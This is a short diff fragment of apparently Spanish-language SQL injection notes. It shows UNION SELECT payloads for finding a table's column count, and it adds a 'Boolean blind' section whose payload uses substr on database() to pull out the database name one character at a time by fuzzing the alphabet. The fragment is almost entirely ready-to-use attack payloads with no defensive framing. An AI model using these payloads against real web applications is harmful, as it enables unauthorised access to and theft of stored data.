@@ -14,3 +14,9 @@ a' union select 1,2,3-- - (error)
 a' union select 1,2,3,4,5,6,7-- - (funciona)
 a' union select 1,2,3,4,5,6,7,8,9-- - (error)
 ```
+
+Boolean blind
+```
+#Fuzzear todo el abecedario hasta que resulte positivo
+1'and (select substr(database(),1,1))='<abecedario>'-- -
+```
